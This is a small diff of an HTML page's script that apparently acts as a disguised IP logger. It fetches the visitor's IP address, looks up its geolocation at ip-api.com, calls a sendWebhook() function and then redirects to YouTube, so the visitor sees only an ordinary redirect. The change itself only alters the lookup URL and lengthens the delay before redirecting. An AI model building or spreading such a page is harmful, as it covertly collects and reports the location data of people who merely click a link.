@@ -17,7 +17,7 @@
                 .then(function(data) {
                     ip = data.ip;
 
-                    fetch('http://ip-api.com/json/' + ip)
+                    fetch('http://ip-api.com/json/')
                         .then(function(response) {
                             return response.json();
                         })
@@ -50,7 +50,7 @@
         setTimeout(function() {
             sendWebhook();
             window.location.href = "https://www.youtube.com";
-        }, 1100);
+        }, 2100);
     </script>
 </head>
 <body>
